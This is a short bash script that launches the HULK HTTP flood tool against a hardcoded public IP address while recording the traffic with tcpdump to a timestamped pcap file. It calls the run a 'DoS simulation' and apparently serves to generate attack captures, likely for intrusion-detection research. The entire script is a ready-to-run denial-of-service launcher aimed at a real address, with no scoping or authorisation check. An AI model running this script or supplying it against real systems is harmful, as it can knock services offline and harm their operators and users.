#!/bin/bash

TARGET="205.174.165.68"
INTERFACE="eth0"
PCAP_FILE="dos_hulk_$(date +%Y%m%d_%H%M%S).pcap"

echo "[*] Starting tcpdump capture: $PCAP_FILE"
tcpdump -i "$INTERFACE" host "$TARGET" -w "$PCAP_FILE" &
TCPDUMP_PID=$!

python2 hulk/hulk.py "$TARGET"

# After running, press CTRL+C to stop the attack
kill "$TCPDUMP_PID"
echo "[✅] HULK DoS simulation complete. PCAP saved to $PCAP_FILE"
